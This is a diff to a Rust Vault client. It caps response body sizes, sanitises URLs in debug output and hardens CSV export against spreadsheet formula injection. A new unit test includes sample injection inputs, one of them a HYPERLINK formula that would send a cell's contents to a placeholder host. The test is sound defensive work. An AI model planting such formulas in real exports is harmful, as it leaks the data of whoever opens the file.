@@ -232,13 +232,11 @@ pub fn vault_authenticate(
 
     if !resp.status().is_success() {
         let status = resp.status();
-        let text = truncate_upstream_error(&resp.text().unwrap_or_default());
+        let text = truncate_upstream_error(&read_text(resp));
         return Err(anyhow::anyhow!("{label} auth failed (HTTP {status}): {text}"));
     }
 
-    let json: serde_json::Value = resp
-        .json()
-        .with_context(|| format!("Failed to parse {label} auth response"))?;
+    let json = read_json(resp).with_context(|| format!("Failed to parse {label} auth response"))?;
     json["auth"]["client_token"]
         .as_str()
         .map(|t| zeroize::Zeroizing::new(t.to_string()))
@@ -379,7 +377,7 @@ impl VaultClient {
         }
 
         if config.debug {
-            eprintln!("    Target        : {addr}");
+            eprintln!("    Target        : {}", crate::debug::sanitize_url(addr));
             eprintln!();
         }
 
@@ -531,16 +529,36 @@ pub fn truncate_upstream_error(s: &str) -> String {
     }
 }
 
+/// Largest Vault response body read. Generous enough for a PKI mount listing
+/// hundreds of thousands of serials, small enough that a hostile or misdirected
+/// server cannot exhaust memory within the request timeout.
+const MAX_VAULT_RESPONSE_BYTES: usize = 32 * 1024 * 1024;
+
+/// Parse a Vault response body as JSON, reading at most
+/// [`MAX_VAULT_RESPONSE_BYTES`].
+fn read_json(resp: reqwest::blocking::Response) -> Result<serde_json::Value> {
+    let body = crate::http::read_capped(resp, MAX_VAULT_RESPONSE_BYTES, "Vault response")?;
+    Ok(serde_json::from_slice(&body)?)
+}
+
+/// A Vault error body as text, capped like [`read_json`]; empty when it
+/// cannot be read.
+fn read_text(resp: reqwest::blocking::Response) -> String {
+    crate::http::read_capped(resp, MAX_VAULT_RESPONSE_BYTES, "Vault response")
+        .map(|b| String::from_utf8_lossy(&b).into_owned())
+        .unwrap_or_default()
+}
+
 fn handle_vault_response(resp: reqwest::blocking::Response, hint: &PolicyHint) -> Result<serde_json::Value> {
     let status = resp.status();
 
     if status.is_success() {
-        let body: serde_json::Value = resp.json().with_context(|| "Failed to parse Vault JSON response")?;
+        let body = read_json(resp).with_context(|| "Failed to parse Vault JSON response")?;
         return Ok(body);
     }
 
     // Try to read error body
-    let body_text = resp.text().unwrap_or_default();
+    let body_text = read_text(resp);
     let vault_errors = serde_json::from_str::<serde_json::Value>(&body_text)
         .ok()
         .and_then(|v| {
@@ -1042,22 +1060,21 @@ pub fn list_certificates(
 
 /// Escape a field value for RFC 4180 CSV output.
 ///
-/// Quotes the field if it contains commas, quotes, newlines, or starts with
-/// characters that could trigger formula injection in spreadsheet applications
-/// (=, +, -, @).
+/// A field that starts with a character a spreadsheet reads as a formula
+/// (`=`, `+`, `-`, `@`, tab or carriage return) gets a leading `'`, as OWASP
+/// recommends: quoting alone does not help, since spreadsheet applications
+/// strip the quotes and still evaluate the formula. Fields with commas,
+/// quotes or line breaks are then quoted.
 fn csv_escape(field: &str) -> String {
-    let needs_quoting = field.contains(',')
-        || field.contains('"')
-        || field.contains('\n')
-        || field.contains('\r')
-        || field.starts_with('=')
-        || field.starts_with('+')
-        || field.starts_with('-')
-        || field.starts_with('@');
-    if needs_quoting {
-        format!("\"{}\"", field.replace('"', "\"\""))
+    let field = if field.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{field}")
     } else {
         field.to_string()
+    };
+    if field.contains([',', '"', '\n', '\r']) {
+        format!("\"{}\"", field.replace('"', "\"\""))
+    } else {
+        field
     }
 }
 
@@ -1864,7 +1881,7 @@ fn vault_health_check(client: &VaultClient) -> Result<VaultHealth> {
         .send()
         .map_err(|e| vault_connection_error(e, &client.base_url, client.debug))?;
 
-    let json: serde_json::Value = resp.json().with_context(|| "Failed to parse Vault health response")?;
+    let json = read_json(resp).with_context(|| "Failed to parse Vault health response")?;
 
     Ok(VaultHealth {
         version: json["version"].as_str().map(String::from),
@@ -2020,6 +2037,19 @@ pub fn interactive_sign(client: &VaultClient) -> Result<SignWizardResult> {
 #[allow(unsafe_code)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn csv_escape_neutralises_formulas_and_quotes_separators() {
+        assert_eq!(csv_escape("www.example.com"), "www.example.com");
+        assert_eq!(csv_escape("=1+1"), "'=1+1");
+        assert_eq!(csv_escape("@SUM(A1)"), "'@SUM(A1)");
+        assert_eq!(csv_escape("\t=cmd"), "'\t=cmd");
+        assert_eq!(
+            csv_escape("=HYPERLINK(\"http://x/?\"&A1,\"x\")"),
+            "\"'=HYPERLINK(\"\"http://x/?\"\"&A1,\"\"x\"\")\""
+        );
+        assert_eq!(csv_escape("a,b"), "\"a,b\"");
+    }
 
     /// A fresh random passphrase for PFX fixtures, so no test carries a
     /// hard coded secret.
